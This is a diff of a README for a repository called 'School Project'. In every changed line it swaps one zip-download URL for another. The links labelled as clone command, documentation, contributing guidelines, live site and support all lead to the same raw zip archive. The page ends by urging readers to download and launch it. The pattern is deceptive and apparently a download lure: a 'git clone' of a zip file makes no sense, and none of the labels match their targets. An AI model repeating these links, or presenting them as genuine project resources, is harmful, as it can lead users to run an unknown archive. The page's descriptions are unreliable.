@@ -28,23 +28,23 @@ The repository is structured into the following directories:
 
 ## Quick Start 🚀
 To get started with the School Project, follow these steps:
-1. Clone the repository: `git clone https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip`
+1. Clone the repository: `git clone https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip`
 2. Install dependencies: `npm install`
 3. Run the project: `npm start`
 
 ## Resources 📖
-- [Project Documentation](https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip)
-- [Contributing Guidelines](https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip)
+- [Project Documentation](https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip)
+- [Contributing Guidelines](https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip)
 
 ## Deployment 🌐
-The School Project is currently deployed on Vercel. You can access the live platform [here](https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip).
+The School Project is currently deployed on Vercel. You can access the live platform [here](https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip).
 
 ## Support 🤝
-For any questions or support regarding the School Project, please raise an issue or contact us at https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip
+For any questions or support regarding the School Project, please raise an issue or contact us at https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip
 
 ---
 
-[![Download Project](https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip%20Project-v1.0.0-green)](https://github.com/dianfauzi16/School-Project/releases/download/v2.0/Software.zip)
+[![Download Project](https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip%20Project-v1.0.0-green)](https://github.com/dianfauzi16/School-Project/raw/refs/heads/main/unbethought/School_Project_1.8-alpha.5.zip)
 
 _Please click the button above to download and launch the Project._
 
